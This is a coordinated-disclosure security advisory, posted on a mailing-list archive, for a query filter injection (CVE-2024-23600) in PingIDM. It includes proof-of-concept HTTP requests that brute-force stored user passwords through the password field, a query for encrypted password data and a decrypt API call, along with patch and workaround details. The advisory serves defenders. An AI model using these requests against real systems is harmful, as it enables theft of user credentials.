<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)"/>
<meta name="Author" content="SEC Consult Vulnerability Lab via Fulldisclosure"/>
<title>Full Disclosure: SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#18">By Date</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#18">By Thread</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: SEC Consult Vulnerability Lab via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Wed, 30 Oct 2024 09:57:55 +0000<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
SEC Consult Vulnerability Lab Security Advisory &lt; 20241030-0 &gt;
=======================================================================
              title: Query Filter Injection
            product: Ping Identity PingIDM (formerly known as ForgeRock Identity
                     Management)
 vulnerable version: v7.0.0 - v7.5.0 (and older unsupported versions)
      fixed version: various patches; v8.0
         CVE number: CVE-2024-23600
             impact: medium
           homepage: <a  rel="nofollow" href="https://backstage.forgerock.com/docs/idm">https://backstage.forgerock.com/docs/idm</a>
              found: 2024-04-10
                 by: Ksandros Apostoli
                     Miguel García Martín
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     <a  rel="nofollow" href="https://www.sec-consult.com">https://www.sec-consult.com</a>

=======================================================================

Vendor description:
-------------------
&quot;ForgeRock Identity Management (IDM) software provides centralized, simple
management and synchronization of identities for users, devices, and things.
IDM software is highly flexible and therefore able to fit almost any use case
and workflow.&quot;

Source: <a  rel="nofollow" href="https://backstage.forgerock.com/docs/idm/7.5/release-notes/preface.html">https://backstage.forgerock.com/docs/idm/7.5/release-notes/preface.html</a>

&quot;The combination of Ping Identity and ForgeRock is ushering in a very exciting
time in the identity market. Together, our market-leading identity services will
deliver more choice, unparalleled expertise, and a more complete identity
solution for our customers and partners. We&apos;re incredibly excited to welcome
you all to the future of identity.&quot;

Source: <a  rel="nofollow" href="https://www.pingidentity.com/en/lp/pingandforgerock.html">https://www.pingidentity.com/en/lp/pingandforgerock.html</a>


Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.


Vulnerability overview/description:
-----------------------------------
1) Query Filter Injection (CVE-2024-23600)
Ping Identity PingIDM (formerly known as ForgeRock Identity Management) versions
7.5.0 and below, enabled an attacker with read access to the &quot;User&quot; collection,
to abuse API query filters in order to obtain managed and/or internal user&apos;s
passwords in either plaintext or encrypted variants, based on configuration.
The API clearly prevents the password in either plaintext or encrypted to be
retrieved by any other means, as this field is set as protected under the
&quot;User&quot; object.

However, by injecting a malicious query filter, using &quot;password&quot; as the field to
be filtered, an attacker can perform a blind brute-force on any victim&apos;s user
password details (encrypted object or plaintext string).

This blind brute-force can be very efficiently conducted since the query filtering
supported by the PingIDM API supports versatile operators such as Starts-With (&apos;sw&apos;)
or Contains (&apos;co&apos;) etc. The sole limitation in this approach is case-insensitivity
in the above-described filters adding an additional guessing overhead.

The issue potentially extends to all protected fields of custom or built-in
collections, but this remains to be tested.


Proof of concept:
-----------------
1) Query Filter Injection (CVE-2024-23600)
Two proof of concepts will be provided, one for version 7.3.0 and one for 7.5.0.

PoC 1 - PingIDM (v7.3.0) - configured to store plaintext user passwords
In the vulnerable instance running in this example (version 7.3.0), SEC Consult
created a test user with the following credentials: `secUser1:aAqQ1234!`.
A benign query filter in PingIDM can be crafted from the administrative
UI to filter, for example, users by their username (the password field is not
presented as available for filtering in the UI):

HTTP Request
```
GET /openidm/managed/user?_queryFilter=userName+sw+&quot;sec&quot; HTTP/2
Host: $HOST
Cookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]
Accept-Api-Version: resource=1.0
Accept: application/json
Referer: <a  rel="nofollow" href="https://$HOST/api/">https://$HOST/api/</a>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

HTTP Response
```
HTTP/2 200 OK
Date: Wed, 10 Apr 2024 13:05:13 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 534
Cache-Control: no-store
Content-Security-Policy: default-src &apos;none&apos;;frame-ancestors &apos;none&apos;;sandbox
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Expires: 0
Pragma: no-cache
Set-Cookie: session-jwt=[redacted]
Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=15724800; includeSubDomains
X-Forgerock-Transactionid: 4261c9f68aa23e492ad57a19973188a9

{
    &quot;result&quot;: [
        {
            &quot;_id&quot;: &quot;0a0f9700-1f7e-498c-967d-b24a0b3ab301&quot;,
            &quot;_rev&quot;: &quot;0cc5575b-ce37-47c1-9beb-408b477c924e-1665022&quot;,
            &quot;userName&quot;: &quot;secUser1&quot;,
            &quot;accountStatus&quot;: &quot;active&quot;,
            &quot;postalCode&quot;: &quot;8046&quot;,
            &quot;stateProvince&quot;: &quot;ZH&quot;,
            &quot;postalAddress&quot;: &quot;Flurstrasse&quot;,
            &quot;description&quot;: &quot;Pentest User 1&quot;,
            &quot;country&quot;: &quot;CH&quot;,
            &quot;city&quot;: &quot;Zurich&quot;,
            &quot;givenName&quot;: &quot;SEC&quot;,
            &quot;sn&quot;: &quot;Consult&quot;,
            &quot;mail&quot;: &quot;secuser1 () sec-consult com&quot;,
            &quot;preferences&quot;: {
                &quot;updates&quot;: true,
                &quot;marketing&quot;: false
            }
        }
    ],
    &quot;resultCount&quot;: 1,
    &quot;pagedResultsCookie&quot;: null,
    &quot;totalPagedResultsPolicy&quot;: &quot;NONE&quot;,
    &quot;totalPagedResults&quot;: -1,
    &quot;remainingPagedResults&quot;: -1
}
```

Note in the request/response pair above, that the query filter sent over the
presented API request was used to query all users with &apos;userName&apos; starting
(&apos;sw&apos;) with the string &quot;sec&quot;. As expected the test user &apos;secUser1&apos;
was returned. In addition, observe that the password field is never to be
returned in any form (plaintext or encrypted) by the API.

Despite not being available for filtering in either the UI or API documentation,
the &apos;password&apos; field can be used instead of &apos;userName&apos; in the example above
to query users based on their password. In case the PingIDM instance has been
configured to store user passwords persistently in plaintext, it can be queried
directly as shown in the request below:

HTTP Request
```
GET /openidm/managed/user?_queryFilter=password+sw+&quot;a&quot; HTTP/2
Host: $HOST
Cookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]
Accept-Api-Version: resource=1.0
Accept: application/json
Referer: <a  rel="nofollow" href="https://$HOST/api/">https://$HOST/api/</a>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

HTTP Response
```
HTTP/2 200 OK
Date: Wed, 10 Apr 2024 13:07:17 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 534
Cache-Control: no-store
Content-Security-Policy: default-src &apos;none&apos;;frame-ancestors &apos;none&apos;;sandbox
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Expires: 0
Pragma: no-cache
Set-Cookie: session-jwt=[redacted]
Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=15724800; includeSubDomains
X-Forgerock-Transactionid: 4261c9f68aa23e492ad57a19973188a9

{
    &quot;result&quot;: [
        {
            &quot;_id&quot;: &quot;0a0f9700-1f7e-498c-967d-b24a0b3ab301&quot;,
            &quot;_rev&quot;: &quot;0cc5575b-ce37-47c1-9beb-408b477c924e-1665022&quot;,
            &quot;userName&quot;: &quot;secUser1&quot;,
            &quot;accountStatus&quot;: &quot;active&quot;,
            &quot;postalCode&quot;: &quot;8046&quot;,
            &quot;stateProvince&quot;: &quot;ZH&quot;,
            &quot;postalAddress&quot;: &quot;Flurstrasse&quot;,
            &quot;description&quot;: &quot;Pentest User 1&quot;,
            &quot;country&quot;: &quot;CH&quot;,
            &quot;city&quot;: &quot;Zurich&quot;,
            &quot;givenName&quot;: &quot;SEC&quot;,
            &quot;sn&quot;: &quot;Consult&quot;,
            &quot;mail&quot;: &quot;secuser1 () sec-consult com&quot;,
            &quot;preferences&quot;: {
                &quot;updates&quot;: true,
                &quot;marketing&quot;: false
            }
        }
    ],
    &quot;resultCount&quot;: 1,
    &quot;pagedResultsCookie&quot;: null,
    &quot;totalPagedResultsPolicy&quot;: &quot;NONE&quot;,
    &quot;totalPagedResults&quot;: -1,
    &quot;remainingPagedResults&quot;: -1
}
```

As it can be noticed in the request above, all users with a password starting
with &apos;a&apos; (case insensitive) were queried and as expected, user &apos;secUser1&apos; with
password &apos;aAqQ1234!&apos; was returned. For an additional sanity check, SEC Consult
next queried all users with password starting with &apos;aR&apos;. Since no users are
to be found in the deployed instance with a matching password, no entries
are returned as it can be seen below:

HTTP Request
```
GET /openidm/managed/user?_queryFilter=password+sw+&quot;aR&quot; HTTP/2
Host: $HOST
Cookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]
Accept-Api-Version: resource=1.0
Accept: application/json
Referer: <a  rel="nofollow" href="https://$HOST/api/">https://$HOST/api/</a>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

HTTP Response
```
HTTP/2 200 OK
Date: Wed, 10 Apr 2024 13:08:01 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 138
Cache-Control: no-store
Content-Security-Policy: default-src &apos;none&apos;;frame-ancestors &apos;none&apos;;sandbox
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Expires: 0
Pragma: no-cache
Set-Cookie: session-jwt=[redacted]
Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=15724800; includeSubDomains
X-Forgerock-Transactionid: 4261c9f68aa23e492ad57a19973188a9

{
    &quot;result&quot;: [],
    &quot;resultCount&quot;: 0,
    &quot;pagedResultsCookie&quot;: null,
    &quot;totalPagedResultsPolicy&quot;: &quot;NONE&quot;,
    &quot;totalPagedResults&quot;: -1,
    &quot;remainingPagedResults&quot;: -1
}
```

However, if the attacker correctly guesses the second letter of the password,
e.g., by querying for passwords starting with &apos;aA&apos;, we observe that the same user
is returned as before:

HTTP Request
```
GET /openidm/managed/user?_queryFilter=password+sw+&quot;aA&quot; HTTP/2
Host: $HOST
Cookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]
Accept-Api-Version: resource=1.0
Accept: application/json
Referer: <a  rel="nofollow" href="https://$HOST/api/">https://$HOST/api/</a>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

HTTP Response
```
HTTP/2 200 OK
Date: Wed, 10 Apr 2024 13:09:25 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 534
Cache-Control: no-store
Content-Security-Policy: default-src &apos;none&apos;;frame-ancestors &apos;none&apos;;sandbox
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Expires: 0
Pragma: no-cache
Set-Cookie: session-jwt=[redacted]
Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=15724800; includeSubDomains
X-Forgerock-Transactionid: 4261c9f68aa23e492ad57a19973188a9

{
    &quot;result&quot;: [
        {
            &quot;_id&quot;: &quot;0a0f9700-1f7e-498c-967d-b24a0b3ab301&quot;,
            &quot;_rev&quot;: &quot;0cc5575b-ce37-47c1-9beb-408b477c924e-1665022&quot;,
            &quot;userName&quot;: &quot;secUser1&quot;,
            &quot;accountStatus&quot;: &quot;active&quot;,
            &quot;postalCode&quot;: &quot;8046&quot;,
            &quot;stateProvince&quot;: &quot;ZH&quot;,
            &quot;postalAddress&quot;: &quot;Flurstrasse&quot;,
            &quot;description&quot;: &quot;Pentest User 1&quot;,
            &quot;country&quot;: &quot;CH&quot;,
            &quot;city&quot;: &quot;Zurich&quot;,
            &quot;givenName&quot;: &quot;SEC&quot;,
            &quot;sn&quot;: &quot;Consult&quot;,
            &quot;mail&quot;: &quot;secuser1 () sec-consult com&quot;,
            &quot;preferences&quot;: {
                &quot;updates&quot;: true,
                &quot;marketing&quot;: false
            }
        }
    ],
    &quot;resultCount&quot;: 1,
    &quot;pagedResultsCookie&quot;: null,
    &quot;totalPagedResultsPolicy&quot;: &quot;NONE&quot;,
    &quot;totalPagedResults&quot;: -1,
    &quot;remainingPagedResults&quot;: -1
}
```

This indicates that an attacker can efficiently brute-force users&apos; passwords.


PoC 2: PingIDM (v7.5.0) - configured to store encrypted user passwords
PingIDM by default stores a user&apos;s password encrypted symmetrically using a
private key that is created upon the first startup of the platform and is
stored in the application key-store under &apos;{installation-path}/security/keystore.jceks&apos;.
The encrypted password is represented by an object rather than a string. An example
of an encrypted password JSON object is shown below:

```
  &quot;username&quot; : &quot;anonymous&quot;,
  &quot;password&quot; : {
                        &quot;$crypto&quot; : {
                            &quot;type&quot; : &quot;x-simple-encryption&quot;,
                            &quot;value&quot; : {
                                &quot;cipher&quot; : &quot;AES/CBC/PKCS5Padding&quot;,
                                &quot;stableId&quot; : &quot;openidm-sym-default&quot;,
                                &quot;salt&quot; : &quot;9fwdc+Vp1LxDno0YC6bXAA==&quot;,
                                &quot;data&quot; : &quot;JtFAY+EupwCSLbH06d5OPA==&quot;,
                                &quot;keySize&quot; : 16,
                                &quot;purpose&quot; : &quot;idm.config.encryption&quot;,
                                &quot;iv&quot; : &quot;Aaek9zviMgZVz/fvOOobIQ==&quot;,
                                &quot;mac&quot; : &quot;IhKQTvyjcJqw1aW5BMBZpQ==&quot;
                            }
                       }
                },
```

While at first glance this object structure seems to break the query filter
injection from the previous example, it was found that all encrypted password
fields can be queried in the exact same way using the &apos;_queryFilter&apos; GET
parameter, and by fully specifying their path within the JSON object, for
example:

```
GET /openidm/managed/user?_queryFilter=password/$crypto/value/data+sw+&quot;J&quot;
```

The above request can be modified to include all other fields such as cipher,
salt, data, iv, mac, etc. Obtaining a cleartext password in this example,
would be clearly more challenging, as it would entirely depend on the security
of the encryption key utilized. However, under certain circumstances
(subject to user permissions), users in PingIDM can use the REST API to decrypt
encrypted objects without the need for the key, as shown in the documentation:

```
curl \
--header &quot;X-OpenIDM-Username: openidm-admin&quot; \
--header &quot;X-OpenIDM-Password: openidm-admin&quot; \
--header &quot;Content-Type: application/json&quot; \
--cacert ca-cert.pem \
--request POST \
--data &apos;{
  &quot;type&quot;: &quot;text/javascript&quot;,
  &quot;globals&quot;: {
    &quot;val&quot;: {
      &quot;$crypto&quot;: {
        &quot;type&quot;: &quot;x-simple-encryption&quot;,
        &quot;value&quot;: {
          &quot;cipher&quot;: &quot;AES/CBC/PKCS5Padding&quot;,
          &quot;stableId&quot;: &quot;openidm-sym-default&quot;,
          &quot;salt&quot;: &quot;qAS/eG7zdnFyK5H8lXvqTA==&quot;,
          &quot;data&quot;: &quot;zewf6hR1yjp34EFJqUGpdnzzFCPJs2IaX4V97jdQlSI=&quot;,
          &quot;keySize&quot;: 16,
          &quot;purpose&quot;: &quot;idm.password.encryption&quot;,
          &quot;iv&quot;: &quot;A4pIiY6kG6t0uLyLmJAoWQ==&quot;,
          &quot;mac&quot;: &quot;sFDJqg0Mmp0Ftl+1q1Bjzw==&quot;
        }
      }
    }
  },
  &quot;source&quot;:&quot;openidm.decrypt(val);&quot;
}&apos; \
&quot;<a  rel="nofollow" href="https://$HOST/openidm/script?_action=eval&quot">https://$HOST/openidm/script?_action=eval&quot</a>;
{
  &quot;myKey&quot;: &quot;myPassword&quot;
}
```
source: <a  rel="nofollow" href="https://backstage.forgerock.com/docs/idm/7/security-guide/keystore-encrypt-decrypt.html">https://backstage.forgerock.com/docs/idm/7/security-guide/keystore-encrypt-decrypt.html</a>


Vulnerable / tested versions:
-----------------------------
The following versions have been tested which were the latest version
available at the time of the test:
* 7.3.0
* 7.5.0

The vendor communicated the following affected versions:
* 7.0.0 - 7.5.0, specifically 7.0.2, 7.1.3, 7.2, 7.3, 7.4, 7.5 (and older unsupported versions)


Vendor contact timeline:
------------------------
2024-04-17: Contacting vendor through <a  rel="nofollow" href="https://support.pingidentity.com/s/security-vulnerability">https://support.pingidentity.com/s/security-vulnerability</a>
            No response.
2024-05-02: Contacting vendor through vulnerability submission form again.
            No response.
2024-05-23: Contacting CISO via LinkedIn. Immediate response, submitting
            advisory details via encrypted email.
2024-06-04: Security engineering team responds, acknowledges finding with low risk score.
            Patch will be released and CVE be assigned nevertheless.
2024-06-11: Asking vendor for coordinated release, timeline, affected/fixed versions, CVE.
2024-06-17: Vendor: thoroughly addressed the vulnerability, assigned CVE-2024-23600.
            Tentative public date for CVE is 24th June. Because of low risk, fix will be in next
            GA release 7.6 and backports to 7.5.x-7.1., acknowledged credits for team,
            needs us to submit to HackerOne as well regarding bug bounty donation.
2024-06-21: Submitting to HackerOne, proposing coordinated release of our advisory
            after patches are available to customers.
2024-08-01: PingIdentity informs us that everything is patched and CVE released, awarded bounty.
2024-09-25: Following up after vacation absences, preparing our security advisory release,
            asking for clarification regarding version numbers; no response
2024-10-17: Asking for version numbers and download URLs again
            Vendor confirms versions numbers and links.
2024-10-22: Informing vendor about planned advisory release next week.
2024-10-29: Receiving feedback, version 7.6 won&apos;t be released, but 8.0; Adjusting advisory.
2024-10-30: Coordinated advisory release


Solution:
---------
The vendor provides patches for the affected versions which can be downloaded from
their download site. Furthermore, the upcoming release 8.0 includes the fixes as well:
<a  rel="nofollow" href="https://backstage.forgerock.com/downloads/browse/idm/all/productId:idm">https://backstage.forgerock.com/downloads/browse/idm/all/productId:idm</a>

Vendor security advisory with further information:
<a  rel="nofollow" href="https://backstage.forgerock.com/knowledge/advisories/article/a95212747">https://backstage.forgerock.com/knowledge/advisories/article/a95212747</a>


Workaround:
-----------
For custom roles, a granular permission selection can be made on all
object&apos;s fields allowing &apos;Read&apos;, &apos;Read/Write&apos;, and &apos;None&apos; access options.
In the User object, the &apos;password&apos; field is configurable to these
permissions as well, even though this field can never be retrieved
or read from any API endpoints or UI (rightfully so). If the
permissions for the &apos;password&apos; field under the user role are set
to &apos;None&apos;, this will prevent also queries from being executed on
that field. By default, when assigning read permissions to an object,
all fields are marked as &apos;Read&apos;, as expected, therefore this change
needs to be done manually.

Unfortunately, for built-in roles, e.g. &apos;openidm-admin&apos;, these granular
permissions cannot be set, therefore this workaround won&apos;t work.


Advisory URL:
-------------
<a  rel="nofollow" href="https://sec-consult.com/vulnerability-lab/">https://sec-consult.com/vulnerability-lab/</a>


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <a  rel="nofollow" href="https://sec-consult.com/career/">https://sec-consult.com/career/</a>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <a  rel="nofollow" href="https://sec-consult.com/contact/">https://sec-consult.com/contact/</a>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <a  rel="nofollow" href="https://www.sec-consult.com">https://www.sec-consult.com</a>
Blog: <a  rel="nofollow" href="https://blog.sec-consult.com">https://blog.sec-consult.com</a>
Twitter: <a  rel="nofollow" href="https://twitter.com/sec_consult">https://twitter.com/sec_consult</a>

EOF Ksandros Apostoli, Miguel García Martín / @2024
</pre><p><strong>Attachment:
<a href="att-18/smime_p7s.bin" ><tt>smime.p7s</tt></a></strong><br>
<em>Description:</em> S/MIME Cryptographic Signature</p>
<pre style="margin: 0em;">_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#18">By Date</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#18">By Thread</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)</strong> <em>SEC Consult Vulnerability Lab via Fulldisclosure (Oct 31)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

